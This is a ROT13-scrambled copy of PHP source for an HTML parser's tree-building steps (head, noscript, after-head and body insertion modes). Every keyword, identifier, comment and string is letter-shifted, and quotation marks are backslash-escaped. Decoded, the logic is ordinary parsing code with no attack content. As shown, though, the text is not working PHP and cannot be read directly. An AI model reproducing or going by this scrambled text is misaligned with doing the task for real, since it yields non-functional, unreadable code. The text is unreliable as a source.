		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va urnq abfpevcg' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va urnq abfpevcg' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vaurnqabfpevcg
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_urnq_abfpevcg(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = cnerag::vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
			 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
			 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 *
			 * Cnefr reebe: vtaber gur gbxra.
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					erghea $guvf->fgrc_va_urnq();
				}

				tbgb va_urnq_abfpevcg_nalguvat_ryfr;
				oernx;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"abfpevcg\"
			 */
			pnfr '-ABFPEVCG':
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ;
				erghea gehr;

			/*
			 * > N pbzzrag gbxra
			 * >
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"onfrsbag\", \"otfbhaq\",
			 * > \"yvax\", \"zrgn\", \"absenzrf\", \"fglyr\"
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
			pnfr '+ONFRSBAG':
			pnfr '+OTFBHAQ':
			pnfr '+YVAX':
			pnfr '+ZRGN':
			pnfr '+ABSENZRF':
			pnfr '+FGLYR':
				erghea $guvf->fgrc_va_urnq();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"oe\"
			 *
			 * Guvf fubhyq arire unccra, nf gur Gnt Cebprffbe ceriragf fubjvat n OE pybfvat gnt.
			 */
		}

		/*
		 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"urnq\", \"abfpevcg\"
		 * > Nal bgure raq gnt
		 */
		vs ( '+URNQ' === $bc || '+ABFPEVCG' === $bc || $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 *
		 * Nalguvat urer vf n cnefr reebe.
		 */
		va_urnq_abfpevcg_nalguvat_ryfr:
		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_URNQ;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'nsgre urnq' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'nsgre urnq' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.7.0 Fgho vzcyrzragngvba.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-nsgre-urnq-vafregvba-zbqr
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_nsgre_urnq(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$vf_pybfre  = cnerag::vf_gnt_pybfre();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( $vf_pybfre ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			/*
			 * > N punenpgre gbxra gung vf bar bs H+0009 PUNENPGRE GNOHYNGVBA,
			 * > H+000N YVAR SRRQ (YS), H+000P SBEZ SRRQ (SS),
			 * > H+000Q PNEEVNTR ERGHEA (PE), be H+0020 FCNPR
			 */
			pnfr '#grkg':
				vs ( cnerag::GRKG_VF_JUVGRFCNPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					// Vafreg gur punenpgre.
					$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
					erghea gehr;
				}
				tbgb nsgre_urnq_nalguvat_ryfr;
				oernx;

			/*
			 * > N pbzzrag gbxra
			 */
			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 */
			pnfr 'ugzy':
				// Cnefr reebe: vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				erghea $guvf->fgrc_va_obql();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"obql\"
			 */
			pnfr '+OBQL':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx    = snyfr;
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"senzrfrg\"
			 */
			pnfr '+SENZRFRG':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_SENZRFRG;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"onfr\", \"onfrsbag\", \"otfbhaq\",
			 * > \"yvax\", \"zrgn\", \"absenzrf\", \"fpevcg\", \"fglyr\", \"grzcyngr\", \"gvgyr\"
			 *
			 * Nalguvat urer vf n cnefr reebe.
			 */
			pnfr '+ONFR':
			pnfr '+ONFRSBAG':
			pnfr '+OTFBHAQ':
			pnfr '+YVAX':
			pnfr '+ZRGN':
			pnfr '+ABSENZRF':
			pnfr '+FPEVCG':
			pnfr '+FGLYR':
			pnfr '+GRZCYNGR':
			pnfr '+GVGYR':
				/*
				 * > Chfu gur abqr cbvagrq gb ol gur urnq ryrzrag cbvagre bagb gur fgnpx bs bcra ryrzragf.
				 * > Cebprff gur gbxra hfvat gur ehyrf sbe gur \"va urnq\" vafregvba zbqr.
				 * > Erzbir gur abqr cbvagrq gb ol gur urnq ryrzrag cbvagre sebz gur fgnpx bs bcra ryrzragf. (Vg zvtug abg or gur pheerag abqr ng guvf cbvag.)
				 */
				$guvf->onvy( 'Pnaabg cebprff ryrzragf nsgre URNQ juvpu erbcra gur URNQ ryrzrag.' );
				/*
				 * Qb abg yrnir guvf oernx va jura nqqvat fhccbeg; vg'f urer gb cerirag
				 * JCPF sebz trggvat pbashfrq ng gur fjvgpu fgehpgher jvgubhg n erghea,
				 * orpnhfr vg qbrfa'g xabj gung `onvy()` nyjnlf guebjf.
				 */
				oernx;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '-GRZCYNGR':
				erghea $guvf->fgrc_va_urnq();

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"obql\", \"ugzy\", \"oe\"
			 *
			 * Pybfvat OE gntf ner nyjnlf ercbegrq ol gur Gnt Cebprffbe nf bcravat gntf.
			 */
			pnfr '-OBQL':
			pnfr '-UGZY':
				/*
				 * > Npg nf qrfpevorq va gur \"nalguvat ryfr\" ragel orybj.
				 */
				tbgb nsgre_urnq_nalguvat_ryfr;
				oernx;
		}

		/*
		 * > N fgneg gnt jubfr gnt anzr vf \"urnq\"
		 * > Nal bgure raq gnt
		 */
		vs ( '+URNQ' === $bc || $vf_pybfre ) {
			// Cnefr reebe: vtaber gur gbxra.
			erghea $guvf->fgrc();
		}

		/*
		 * > Nalguvat ryfr
		 * > Vafreg na UGZY ryrzrag sbe n \"obql\" fgneg gnt gbxra jvgu ab nggevohgrf.
		 */
		nsgre_urnq_nalguvat_ryfr:
		$guvf->vafreg_iveghny_abqr( 'OBQL' );
		$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_OBQL;
		erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );
	}

	/**
	 * Cnefrf arkg ryrzrag va gur 'va obql' vafregvba zbqr.
	 *
	 * Guvf vagreany shapgvba cresbezf gur 'va obql' vafregvba zbqr
	 * ybtvp sbe gur trarenyvmrq JC_UGZY_Cebprffbe::fgrc() shapgvba.
	 *
	 * @fvapr 6.4.0
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Jura rapbhagrevat hafhccbegrq UGZY vachg.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cnefvat-znva-vaobql
	 * @frr JC_UGZY_Cebprffbe::fgrc
	 *
	 * @erghea obby Jurgure na ryrzrag jnf sbhaq.
	 */
	cevingr shapgvba fgrc_va_obql(): obby {
		$gbxra_anzr = $guvf->trg_gbxra_anzr();
		$gbxra_glcr = $guvf->trg_gbxra_glcr();
		$bc_fvtvy   = '#gnt' === $gbxra_glcr ? ( cnerag::vf_gnt_pybfre() ? '-' : '+' ) : '';
		$bc         = \"{$bc_fvtvy}{$gbxra_anzr}\";

		fjvgpu ( $bc ) {
			pnfr '#grkg':
				/*
				 * > N punenpgre gbxra gung vf H+0000 AHYY
				 *
				 * Nal fhpprffvir frdhrapr bs AHYY olgrf vf vtaberq naq jba'g
				 * gevttre npgvir sbezng erpbafgehpgvba. Gurersber, vs gur grkg
				 * bayl pbzcevfrf AHYY olgrf gura gur gbxra fubhyq or vtaberq
				 * urer, ohg vs gurer ner nal bgure punenpgref va gur fgernz
				 * gur npgvir sbezngf fubhyq or erpbafgehpgrq.
				 */
				vs ( cnerag::GRKG_VF_AHYY_FRDHRAPR === $guvf->grkg_abqr_pynffvsvpngvba ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();

				/*
				 * Juvgrfcnpr-bayl grkg qbrf abg nssrpg gur senzrfrg-bx synt.
				 * Vg vf cebonoyl vagre-ryrzrag juvgrfcnpr, ohg vg znl nyfb
				 * pbagnva punenpgre ersreraprf juvpu qrpbqr bayl gb juvgrfcnpr.
				 */
				vs ( cnerag::GRKG_VF_TRAREVP === $guvf->grkg_abqr_pynffvsvpngvba ) {
					$guvf->fgngr->senzrfrg_bx = snyfr;
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			pnfr '#pbzzrag':
			pnfr '#shaxl-pbzzrag':
			pnfr '#cerfhzcghbhf-gnt':
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N QBPGLCR gbxra
			 * > Cnefr reebe. Vtaber gur gbxra.
			 */
			pnfr 'ugzy':
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '+UGZY':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' ) ) {
					/*
					 * > Bgurejvfr, sbe rnpu nggevohgr ba gur gbxra, purpx gb frr vs gur nggevohgr
					 * > vf nyernql cerfrag ba gur gbc ryrzrag bs gur fgnpx bs bcra ryrzragf. Vs
					 * > vg vf abg, nqq gur nggevohgr naq vgf pbeerfcbaqvat inyhr gb gung ryrzrag.
					 *
					 * Guvf cnefre qbrf abg pheeragyl fhccbeg guvf orunivbe: vtaber gur gbxra.
					 */
				}

				// Vtaber gur gbxra.
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"onfr\", \"onfrsbag\", \"otfbhaq\", \"yvax\",
			 * > \"zrgn\", \"absenzrf\", \"fpevcg\", \"fglyr\", \"grzcyngr\", \"gvgyr\"
			 * >
			 * > Na raq gnt jubfr gnt anzr vf \"grzcyngr\"
			 */
			pnfr '+ONFR':
			pnfr '+ONFRSBAG':
			pnfr '+OTFBHAQ':
			pnfr '+YVAX':
			pnfr '+ZRGN':
			pnfr '+ABSENZRF':
			pnfr '+FPEVCG':
			pnfr '+FGLYR':
			pnfr '+GRZCYNGR':
			pnfr '+GVGYR':
			pnfr '-GRZCYNGR':
				erghea $guvf->fgrc_va_urnq();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"obql\"
			 *
			 * Guvf gnt va gur VA OBQL vafregvba zbqr vf n cnefr reebe.
			 */
			pnfr '+OBQL':
				vs (
					1 === $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbhag() ||
					'OBQL' !== ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->ng( 2 )->abqr_anzr ?? ahyy ) ||
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' )
				) {
					// Vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				/*
				 * > Bgurejvfr, frg gur senzrfrg-bx synt gb \"abg bx\"; gura, sbe rnpu nggevohgr
				 * > ba gur gbxra, purpx gb frr vs gur nggevohgr vf nyernql cerfrag ba gur obql
				 * > ryrzrag (gur frpbaq ryrzrag) ba gur fgnpx bs bcra ryrzragf, naq vs vg vf
				 * > abg, nqq gur nggevohgr naq vgf pbeerfcbaqvat inyhr gb gung ryrzrag.
				 *
				 * Guvf cnefre qbrf abg pheeragyl fhccbeg guvf orunivbe: vtaber gur gbxra.
				 */
				$guvf->fgngr->senzrfrg_bx = snyfr;
				erghea $guvf->fgrc();

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"senzrfrg\"
			 *
			 * Guvf gnt va gur VA OBQL vafregvba zbqr vf n cnefr reebe.
			 */
			pnfr '+SENZRFRG':
				vs (
					1 === $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbhag() ||
					'OBQL' !== ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->ng( 2 )->abqr_anzr ?? ahyy ) ||
					snyfr === $guvf->fgngr->senzrfrg_bx
				) {
					// Vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				/*
				 * > Bgurejvfr, eha gur sbyybjvat fgrcf:
				 */
				$guvf->onvy( 'Pnaabg cebprff aba-vtaberq SENZRFRG gntf.' );
				oernx;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"obql\"
			 */
			pnfr '-OBQL':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'OBQL' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				/*
				 * > Bgurejvfr, vs gurer vf n abqr va gur fgnpx bs bcra ryrzragf gung vf abg rvgure n
				 * > qq ryrzrag, n qg ryrzrag, na yv ryrzrag, na bcgtebhc ryrzrag, na bcgvba ryrzrag,
				 * > n c ryrzrag, na eo ryrzrag, na ec ryrzrag, na eg ryrzrag, na egp ryrzrag, n gobql
				 * > ryrzrag, n gq ryrzrag, n gsbbg ryrzrag, n gu ryrzrag, n guernq ryrzrag, n ge
				 * > ryrzrag, gur obql ryrzrag, be gur ugzy ryrzrag, gura guvf vf n cnefr reebe.
				 *
				 * Gurer vf abguvat gb qb sbe guvf cnefr reebe, fb qba'g purpx sbe vg.
				 */

				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_OBQL;
				/*
				 * Gur OBQL ryrzrag vf abg erzbirq sebz gur fgnpx bs bcra ryrzragf.
				 * Bayl vagreany fgngr unf punatrq, guvf qbrf abg dhnyvsl nf n \"fgrc\"
				 * va grezf bs nqinapvat guebhtu gur qbphzrag gb nabgure gbxra.
				 * Abguvat unf orra chfurq be cbccrq.
				 * Cebprrq gb cnefr gur arkg vgrz.
				 */
				erghea $guvf->fgrc();

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"ugzy\"
			 */
			pnfr '-UGZY':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'OBQL' ) ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				/*
				 * > Bgurejvfr, vs gurer vf n abqr va gur fgnpx bs bcra ryrzragf gung vf abg rvgure n
				 * > qq ryrzrag, n qg ryrzrag, na yv ryrzrag, na bcgtebhc ryrzrag, na bcgvba ryrzrag,
				 * > n c ryrzrag, na eo ryrzrag, na ec ryrzrag, na eg ryrzrag, na egp ryrzrag, n gobql
				 * > ryrzrag, n gq ryrzrag, n gsbbg ryrzrag, n gu ryrzrag, n guernq ryrzrag, n ge
				 * > ryrzrag, gur obql ryrzrag, be gur ugzy ryrzrag, gura guvf vf n cnefr reebe.
				 *
				 * Gurer vf abguvat gb qb sbe guvf cnefr reebe, fb qba'g purpx sbe vg.
				 */

				$guvf->fgngr->vafregvba_zbqr = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_NSGRE_OBQL;
				erghea $guvf->fgrc( frys::ERCEBPRFF_PHEERAG_ABQR );

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"nqqerff\", \"negvpyr\", \"nfvqr\",
			 * > \"oybpxdhbgr\", \"pragre\", \"qrgnvyf\", \"qvnybt\", \"qve\", \"qvi\", \"qy\",
			 * > \"svryqfrg\", \"svtpncgvba\", \"svther\", \"sbbgre\", \"urnqre\", \"utebhc\",
			 * > \"znva\", \"zrah\", \"ani\", \"by\", \"c\", \"frnepu\", \"frpgvba\", \"fhzznel\", \"hy\"
			 */
			pnfr '+NQQERFF':
			pnfr '+NEGVPYR':
			pnfr '+NFVQR':
			pnfr '+OYBPXDHBGR':
			pnfr '+PRAGRE':
			pnfr '+QRGNVYF':
			pnfr '+QVNYBT':
			pnfr '+QVE':
			pnfr '+QVI':
			pnfr '+QY':
			pnfr '+SVRYQFRG':
			pnfr '+SVTPNCGVBA':
			pnfr '+SVTHER':
			pnfr '+SBBGRE':
			pnfr '+URNQRE':
			pnfr '+UTEBHC':
			pnfr '+ZNVA':
			pnfr '+ZRAH':
			pnfr '+ANI':
			pnfr '+BY':
			pnfr '+C':
			pnfr '+FRNEPU':
			pnfr '+FRPGVBA':
			pnfr '+FHZZNEL':
			pnfr '+HY':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"u1\", \"u2\", \"u3\", \"u4\", \"u5\", \"u6\"
			 */
			pnfr '+U1':
			pnfr '+U2':
			pnfr '+U3':
			pnfr '+U4':
			pnfr '+U5':
			pnfr '+U6':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				vs (
					va_neenl(
						$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr()->abqr_anzr,
						neenl( 'U1', 'U2', 'U3', 'U4', 'U5', 'U6' ),
						gehr
					)
				) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr.
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"cer\", \"yvfgvat\"
			 */
			pnfr '+CER':
			pnfr '+YVFGVAT':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				/*
				 * > Vs gur arkg gbxra vf n H+000N YVAR SRRQ (YS) punenpgre gbxra,
				 * > gura vtaber gung gbxra naq zbir ba gb gur arkg bar. (Arjyvarf
				 * > ng gur fgneg bs cer oybpxf ner vtaberq nf na nhgubevat pbairavrapr.)
				 *
				 * Guvf vf unaqyrq va `trg_zbqvsvnoyr_grkg()`.
				 */

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx = snyfr;
				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"sbez\"
			 */
			pnfr '+SBEZ':
				$fgnpx_pbagnvaf_grzcyngr = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' );

				vs ( vffrg( $guvf->fgngr->sbez_ryrzrag ) && ! $fgnpx_pbagnvaf_grzcyngr ) {
					// Cnefr reebe: vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				vs ( ! $fgnpx_pbagnvaf_grzcyngr ) {
					$guvf->fgngr->sbez_ryrzrag = $guvf->fgngr->pheerag_gbxra;
				}

				erghea gehr;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"yv\"
			 * > N fgneg gnt jubfr gnt anzr vf bar bs: \"qq\", \"qg\"
			 */
			pnfr '+QQ':
			pnfr '+QG':
			pnfr '+YV':
				$guvf->fgngr->senzrfrg_bx = snyfr;
				$abqr                     = $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr();
				$vf_yv                    = 'YV' === $gbxra_anzr;

				va_obql_yvfg_ybbc:
				/*
				 * Gur ybtvp sbe YV naq QG/QQ vf gur fnzr rkprcg sbe bar cbvag: YV ryrzragf _bayl_
				 * pybfr bgure YV ryrzragf, ohg n QG be QQ ryrzrag pybfrf _nal_ bcra QG be QQ ryrzrag.
				 */
				vs ( $vf_yv ? 'YV' === $abqr->abqr_anzr : ( 'QQ' === $abqr->abqr_anzr || 'QG' === $abqr->abqr_anzr ) ) {
					$abqr_anzr = $vf_yv ? 'YV' : $abqr->abqr_anzr;
					$guvf->trarengr_vzcyvrq_raq_gntf( $abqr_anzr );
					vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $abqr_anzr ) ) {
						// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr. Guvf reebe qbrf abg vzcnpg gur ybtvp urer.
					}

					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( $abqr_anzr );
					tbgb va_obql_yvfg_qbar;
				}

				vs (
					'NQQERFF' !== $abqr->abqr_anzr &&
					'QVI' !== $abqr->abqr_anzr &&
					'C' !== $abqr->abqr_anzr &&
					frys::vf_fcrpvny( $abqr )
				) {
					/*
					 * > Vs abqr vf va gur fcrpvny pngrtbel, ohg vf abg na nqqerff, qvi,
					 * > be c ryrzrag, gura whzc gb gur fgrc ynoryrq qbar orybj.
					 */
					tbgb va_obql_yvfg_qbar;
				} ryfr {
					/*
					 * > Bgurejvfr, frg abqr gb gur cerivbhf ragel va gur fgnpx bs bcra ryrzragf
					 * > naq erghea gb gur fgrc ynoryrq ybbc.
					 */
					sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc( $abqr ) nf $vgrz ) {
						$abqr = $vgrz;
						oernx;
					}
					tbgb va_obql_yvfg_ybbc;
				}

				va_obql_yvfg_qbar:
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				erghea gehr;

			pnfr '+CYNVAGRKG':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_c_va_ohggba_fpbcr() ) {
					$guvf->pybfr_n_c_ryrzrag();
				}

				/*
				 * @gbqb Guvf znl arrq gb or unaqyrq va gur Gnt Cebprffbe naq ghea vagb
				 *       n fvatyr frys-pbagnvarq gnt yvxr GRKGNERN, jubfr zbqvsvnoyr grkg
				 *       vf gur erfg bs gur vachg qbphzrag nf cynvagrkg.
				 */
				$guvf->onvy( 'Pnaabg cebprff CYNVAGRKG ryrzragf.' );
				oernx;

			/*
			 * > N fgneg gnt jubfr gnt anzr vf \"ohggba\"
			 */
			pnfr '+OHGGBA':
				vs ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'OHGGBA' ) ) {
					// @gbqb Vaqvpngr n cnefr reebe bapr vg'f cbffvoyr. Guvf reebe qbrf abg vzcnpg gur ybtvp urer.
					$guvf->trarengr_vzcyvrq_raq_gntf();
					$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( 'OHGGBA' );
				}

				$guvf->erpbafgehpg_npgvir_sbeznggvat_ryrzragf();
				$guvf->vafreg_ugzy_ryrzrag( $guvf->fgngr->pheerag_gbxra );
				$guvf->fgngr->senzrfrg_bx = snyfr;

				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf bar bs: \"nqqerff\", \"negvpyr\", \"nfvqr\", \"oybpxdhbgr\",
			 * > \"ohggba\", \"pragre\", \"qrgnvyf\", \"qvnybt\", \"qve\", \"qvi\", \"qy\", \"svryqfrg\",
			 * > \"svtpncgvba\", \"svther\", \"sbbgre\", \"urnqre\", \"utebhc\", \"yvfgvat\", \"znva\",
			 * > \"zrah\", \"ani\", \"by\", \"cer\", \"frnepu\", \"frpgvba\", \"fhzznel\", \"hy\"
			 */
			pnfr '-NQQERFF':
			pnfr '-NEGVPYR':
			pnfr '-NFVQR':
			pnfr '-OYBPXDHBGR':
			pnfr '-OHGGBA':
			pnfr '-PRAGRE':
			pnfr '-QRGNVYF':
			pnfr '-QVNYBT':
			pnfr '-QVE':
			pnfr '-QVI':
			pnfr '-QY':
			pnfr '-SVRYQFRG':
			pnfr '-SVTPNCGVBA':
			pnfr '-SVTHER':
			pnfr '-SBBGRE':
			pnfr '-URNQRE':
			pnfr '-UTEBHC':
			pnfr '-YVFGVAT':
			pnfr '-ZNVA':
			pnfr '-ZRAH':
			pnfr '-ANI':
			pnfr '-BY':
			pnfr '-CER':
			pnfr '-FRNEPU':
			pnfr '-FRPGVBA':
			pnfr '-FHZZNEL':
			pnfr '-HY':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( $gbxra_anzr ) ) {
					// @gbqb Ercbeg cnefr reebe.
					// Vtaber gur gbxra.
					erghea $guvf->fgrc();
				}

				$guvf->trarengr_vzcyvrq_raq_gntf();
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pheerag_abqr_vf( $gbxra_anzr ) ) {
					// @gbqb Erpbeq cnefr reebe: guvf reebe qbrfa'g vzcnpg cnefvat.
				}
				$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->cbc_hagvy( $gbxra_anzr );
				erghea gehr;

			/*
			 * > Na raq gnt jubfr gnt anzr vf \"sbez\"
			 */
			pnfr '-SBEZ':
				vs ( ! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->pbagnvaf( 'GRZCYNGR' ) ) {
					$abqr                      = $guvf->fgngr->sbez_ryrzrag;
					$guvf->fgngr->sbez_ryrzrag = ahyy;

					/*
					 * > Vs abqr vf ahyy be vs gur fgnpx bs bcra ryrzragf qbrf abg unir abqr
					 * > va fpbcr, gura guvf vf n cnefr reebe; erghea naq vtaber gur gbxra.
					 *
					 * @gbqb Vg'f arprffnel gb purpx vs gur sbez gbxra vgfrys vf va fpbcr, abg
					 *       fvzcyl jurgure nal SBEZ vf va fpbcr.
					 */
					vs (
						ahyy === $abqr ||
						! $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->unf_ryrzrag_va_fpbcr( 'SBEZ' )
					) {
						// Cnefr reebe: vtaber gur gbxra.
